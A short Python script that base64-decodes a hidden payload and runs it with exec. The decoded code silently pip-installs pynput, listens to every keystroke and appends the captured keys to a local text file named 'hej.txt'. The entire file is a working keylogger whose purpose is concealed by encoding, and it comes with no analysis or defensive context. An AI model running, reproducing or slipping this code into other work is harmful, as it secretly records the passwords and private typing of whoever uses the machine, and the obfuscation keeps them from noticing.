import base64

kingen = "aW1wb3J0IHN5cwppbXBvcnQgc3VicHJvY2VzcwojIGltcGxlbWVudCBwaXAgYXMgYSBzdWJwcm9jZXNzOgpzdWJwcm9jZXNzLmNoZWNrX2NhbGwoW3N5cy5leGVjdXRhYmxlLCAnLW0nLCAncGlwJywgJ2luc3RhbGwnLCAKJ3B5bnB1dCddKQoKZnJvbSBweW5wdXQua2V5Ym9hcmQgaW1wb3J0IEtleSwgTGlzdGVuZXIKCgoKCmNvdW50ID0gMAp0YW5ncyA9IFtdCgpkZWYgb25fdHJ5Y2sodGFuZyk6CiAgICBnbG9iYWwgdGFuZ3MsIGNvdW50CiAgICB0YW5ncy5hcHBlbmQodGFuZykKICAgIGNvdW50ICs9IDEKICAgIHByaW50KCJ7MH0gcHJlc3NlZCIuZm9ybWF0KHRhbmcpKQoKICAgIGlmIGNvdW50ID49IDEwOgogICAgICAgIGNvdW50ID0gMAogICAgICAgIHdyaXRlX2ZpbGUodGFuZ3MpCiAgICAgICAgdGFuZ3MgPSBbXQoKZGVmIHdyaXRlX2ZpbGUodGFuZ3MpOgogICAgd2l0aCBvcGVuKCJoZWoudHh0IiwgImEiKSBhcyBmOgogICAgICAgIGZvciB0YW5nIGluIHRhbmdzOgogICAgICAgICAgICBrID0gc3RyKHRhbmcpLnJlcGxhY2UoIiciLCIiKQogICAgICAgICAgICBpZiBrLmZpbmQoInNwYWNlIikgPiAwIG9yIGsuZmluZCgiZW50ZXIiKSA+IDA6CiAgICAgICAgICAgICAgICBmLndyaXRlKCdcbicpCiAgICAgICAgICAgIGVsaWYgay5maW5kKCJLZXkiKSA9PSAtMToKICAgICAgICAgICAgICAgIGYud3JpdGUoaykKCmRlZiBvbl9zbGFwcCh0YW5nKToKICAgIGlmIHRhbmcgPT0gS2V5LmVzYzoKICAgICAgICByZXR1cm4gRmFsc2UKCndpdGggTGlzdGVuZXIob25fcHJlc3M9b25fdHJ5Y2ssIG9uX3JlbGVhc2U9b25fc2xhcHApIGFzIGxpc3RlbmVyOgogICAgbGlzdGVuZXIuam9pbigp"

exec(base64.b64decode(kingen))